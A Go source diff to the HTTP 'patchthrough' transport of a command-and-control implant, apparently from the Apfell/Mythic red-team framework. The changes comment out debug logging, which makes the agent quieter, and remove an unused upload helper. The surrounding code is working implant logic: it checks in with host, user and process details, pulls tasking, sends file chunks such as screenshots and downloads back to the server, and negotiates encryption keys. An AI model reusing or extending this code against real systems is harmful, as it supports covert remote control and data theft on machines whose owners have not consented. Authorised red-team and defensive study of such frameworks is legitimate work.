@@ -23,7 +23,7 @@ import (
 
 // Static vars for the Restful patchthrough profile
 // Confirm that these values match what is in the config.json
-// Note: the leading slash should not be included
+// Note: the leading slash should NOT be included
 
 var (
 	GetNextTaskURL        = "admin.php?q=CID_REPLACE"
@@ -159,25 +159,25 @@ func (c *C2Patchthrough) CheckIn(ip string, pid int, user string, host string) i
 	} else {
 		checkin.IntegrityLevel = 2
 	}
-	log.Println("Sending checkin:")
+	//log.Println("Sending checkin:")
 	checkinMsg, _ := json.Marshal(checkin)
-	log.Println(string(checkinMsg))
+	//log.Println(string(checkinMsg))
 	// If exchangingKeys == true, then start EKE
 	if c.ExchangingKeys {
-		log.Println("Exchanging keys checkin...")
+		//log.Println("Exchanging keys checkin...")
 		sID := c.NegotiateKey()
 
 		endpoint := strings.Replace(PostNewCallbackEKE, "UUID_REPLACE", sID, -1)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 
 	} else if len(c.AesPSK) != 0 {
-		log.Println("AES PSK checkin...")
+		//log.Println("AES PSK checkin...")
 		// If we're using a static AES key, then just hit the aes_psk endpoint
 		endpoint := strings.Replace(PostNewCallbackAESPSK, "UUID_REPLACE", c.UUID, -1)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 	} else {
 		// If we're not using encryption, we hit the callbacks endpoint directly
-		log.Println("Unencrypted checkin...")
+		//log.Println("Unencrypted checkin...")
 		resp = c.htmlPostData(PostNewCallback, checkinMsg)
 	}
 
@@ -185,8 +185,8 @@ func (c *C2Patchthrough) CheckIn(ip string, pid int, user string, host string) i
 	respMsg := structs.CheckinResponse{}
 	err := json.Unmarshal(resp, &respMsg)
 	if err != nil {
-		log.Printf("Error in unmarshal:\n %s", err.Error())
-		log.Println(respMsg)
+		//log.Printf("Error in unmarshal:\n %s", err.Error())
+		//log.Println(respMsg)
 		return respMsg
 	}
 
@@ -196,9 +196,9 @@ func (c *C2Patchthrough) CheckIn(ip string, pid int, user string, host string) i
 //GetTasking - retrieve new tasks
 func (c C2Patchthrough) GetTasking() interface{} {
 	endpoint := strings.Replace(GetNextTaskURL, "CID_REPLACE", c.ApfID(), -1)
-	log.Println("Endpoint:", endpoint)
+	//log.Println("Endpoint:", endpoint)
 	url := fmt.Sprintf("%s%s", c.URL(), endpoint)
-	log.Println("URL:", url)
+	//log.Println("URL:", url)
 	rawTask := c.htmlGetData(url)
 	task := structs.Task{}
 	err := json.Unmarshal(rawTask, &task)
@@ -247,7 +247,7 @@ func (c *C2Patchthrough) postRESTResponse(urlEnding string, data []byte) []byte 
 //htmlPostData HTTP POST function
 func (c *C2Patchthrough) htmlPostData(urlEnding string, sendData []byte) []byte {
 	url := fmt.Sprintf("%s%s", c.URL(), urlEnding)
-	log.Println("Posting to URL:", url)
+	//log.Println("Posting to URL:", url)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.AesPSK) != 0 {
 		sendData = c.encryptMessage(sendData)
@@ -378,23 +378,6 @@ func (c *C2Patchthrough) GetFile(fileid string) []byte {
 	return make([]byte, 0)
 }
 
-//Upload the data
-func (c *C2Patchthrough) Upload(task structs.Task, fileid string) []byte {
-
-	strApfellID := fmt.Sprintf("%s", c.ApfID())
-	strFID := fmt.Sprintf("%s", fileid)
-	url := strings.Replace(GetFile, "CID_REPLACE", strApfellID, -1)
-	url = strings.Replace(url, "FID_REPLACE", strFID, -1)
-	encfileData := c.htmlGetData(fmt.Sprintf("%s%s", c.URL(), url))
-
-	if len(encfileData) > 0 {
-		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
-		return rawData
-	}
-
-	return make([]byte, 0)
-}
-
 //SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
 func (c *C2Patchthrough) SendFileChunks(task structs.Task, fileData []byte) {
 
@@ -462,7 +445,7 @@ func (c *C2Patchthrough) SendFileChunks(task structs.Task, fileData []byte) {
 //NegotiateKey - EKE key negotiation
 func (c *C2Patchthrough) NegotiateKey() string {
 	sessionID := c.GenerateSessionID()
-	log.Println("Generated sessionID:", sessionID)
+	//log.Println("Generated sessionID:", sessionID)
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.SetRsaKey(priv)
 	initMessage := structs.EKEInit{}
@@ -480,7 +463,7 @@ func (c *C2Patchthrough) NegotiateKey() string {
 
 	// Send the request to the EKE endpoint
 	endpoint := strings.Replace(PostNewCallbackEKE, "UUID_REPLACE", c.UUID, -1)
-	log.Println("In NegotiateKey - posting to endpoint:", endpoint)
+	//log.Println("In NegotiateKey - posting to endpoint:", endpoint)
 	resp := c.htmlPostData(endpoint, unencryptedMsg)
 	// Decrypt & Unmarshal the response
 
@@ -498,7 +481,7 @@ func (c *C2Patchthrough) NegotiateKey() string {
 	// Save the new AES session key
 	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
 	c.SetXKeys(false)
-	log.Println("Returning sessionID:", sessionID)
+	//log.Println("Returning sessionID:", sessionID)
 	return sessionID
 }
 func (c *C2Patchthrough) encryptMessage(msg []byte) []byte {
